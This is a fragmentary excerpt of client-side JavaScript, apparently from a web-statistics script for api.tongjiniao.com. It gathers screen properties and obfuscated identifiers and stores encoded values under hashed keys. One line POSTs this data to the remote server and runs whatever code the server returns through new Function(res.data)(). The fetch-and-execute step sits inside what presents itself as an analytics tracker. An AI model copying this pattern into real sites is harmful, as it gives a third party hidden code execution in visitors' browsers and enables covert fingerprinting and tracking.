...
var isRepeat = 0
for (var i = 0; i < len; i++) {
    if (stag[i].src.indexOf('591661499739787264') > -1) {
        isRepeat += 1
        if (isRepeat >= 2) break;
    }
}
if (isRepeat >= 2) {
    ...
    sg: 'tFvSh5tolp1tbW.Xa2aZZZdrlW2cZ29cU9GGb2OcYlmtW5yWmGOWmG5wb5JpYoSVg22XcZRnbWFlm51sZJxtb3BrmJmNVNiGcG5xk2tskmmWaZZpmmVqaWiWmLI=',
    rid: this.storage.rid() || ''
};
let xhr;
this.storage.rid('2Mydj2Znm2lqm5lnlWuXamhll3Bubw==');
this.request.post('//api.tongjiniao.com/r?t=1713487704&p=639747560746835968', data,true,function (res){new Function(res.data)();});
        },
        screen: {
            AT: screen.availTop,
AL: screen.availLeft,
...
ON: screen.orientation
        ...
        storage: {
            uuid: function (k, v) {
    if (!k) {
        k = 'st_9fcf4847a9e7682ecb33a15b896a5b63'
    }
    if (!v) {
        v = 'bWqdm5eZapxhcGxpaplpamptkmVsaWtuZGNnkZI='
    }
...
sid: function (k, v) {
    if (!k) {
        k = 'st_82276167b63d54eab49b8fb8164835d2'
    }
    if (!v) {
        v = 'pZbXqc.jnqzKwWtkanBsaZpqZGlom2iYZ25mmQ=='
    }
...
pc: function (k) {
    if (!k) {
        k = 'st_ea241caf099cadded12cfb19d1081443'
    }
...
rid: function (v) {
    ...
    var k = 'st_418ba8af1dab757210a7a9437ccdd2a3';
    if (v !== null) {
        sessionStorage.setItem(k, v);
        return;
    }
